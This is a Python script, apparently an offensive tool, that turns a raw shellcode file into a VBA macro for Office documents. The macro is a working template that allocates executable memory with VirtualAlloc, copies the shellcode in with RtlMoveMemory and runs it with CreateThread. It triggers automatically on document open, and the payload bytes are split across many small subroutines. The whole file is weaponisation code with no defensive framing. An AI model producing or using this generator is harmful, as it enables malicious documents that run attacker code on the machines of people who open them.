  GNU nano 8.6                                                                                                                                                                                                                                                      bin_to_vba/bin_to_vba.py
#!/usr/bin/env python3

import argparse
import sys
from pathlib import Path

VBA_HEADER = """\
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
"""

VBA_MAIN = """\
Function MyMacro()
  Dim buf() As Byte
  ReDim buf({sz_minus1})
{calls}
  Dim addr As LongPtr
  Dim res As LongPtr
  addr = VirtualAlloc(0, {sz}, &H3000, &H40)
  res = RtlMoveMemory(addr, buf(0), {sz})
  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub
"""


def make_fill_sub(idx: int, offset: int, chunks: list) -> str:
    lines = [f"Sub FillBuf{idx}(buf() As Byte)"]
    lines.append("  Dim tmp As Variant")
    lines.append("  Dim i As Long")
    cur = offset
    for chunk in chunks:
        nums = ",".join(str(b) for b in chunk)
        lines.append(f"  tmp = Array({nums})")
        lines.append(f"  For i = 0 To UBound(tmp)")
        lines.append(f"    buf({cur} + i) = CByte(tmp(i))")
        lines.append(f"  Next i")
        cur += len(chunk)
    lines.append("End Sub")
    return "\n".join(lines)


def bytes_to_vba(data: bytes, chunk_size: int = 50, chunks_per_sub: int = 10) -> str:
    values = list(data)
    total = len(values)

    chunks = [values[i:i + chunk_size] for i in range(0, len(values), chunk_size)]
    groups = [chunks[i:i + chunks_per_sub] for i in range(0, len(chunks), chunks_per_sub)]

    parts = [VBA_HEADER]
    call_lines = []
    offset = 0

    for g_idx, group in enumerate(groups):
        parts.append(make_fill_sub(g_idx, offset, group))
        parts.append("")
        call_lines.append(f"  FillBuf{g_idx} buf")
        offset += sum(len(c) for c in group)

    parts.append(VBA_MAIN.format(
        sz=total,
        sz_minus1=total - 1,
        calls="\n".join(call_lines),
    ))

    return "\n".join(parts)


def main():
    parser = argparse.ArgumentParser(
        description="Convert binary shellcode to a VBA macro."
    )
    parser.add_argument("input", help="Input binary file (shellcode)")
    parser.add_argument("-o", "--output", help="Output .vba file (default: stdout)")
    parser.add_argument(
        "--chunk", type=int, default=50, metavar="N",
        help="Bytes per Array() call (default: 50)",
    )
    parser.add_argument(
        "--chunks-per-sub", type=int, default=10, metavar="M",
        help="Number of Array() calls per Sub (default: 10)",
    )
    args = parser.parse_args()

    path = Path(args.input)
    if not path.exists():
        print(f"[!] File not found: {path}", file=sys.stderr)
        sys.exit(1)

    data = path.read_bytes()
    if len(data) == 0:
        print("[!] File is empty.", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Shellcode read: {len(data)} bytes", file=sys.stderr)
    vba = bytes_to_vba(data, chunk_size=args.chunk, chunks_per_sub=args.chunks_per_sub)

    if args.output:
        Path(args.output).write_text(vba, encoding="utf-8")
        print(f"[+] Macro written to: {args.output}", file=sys.stderr)
    else:
        print(vba)


if __name__ == "__main__":
    main()


















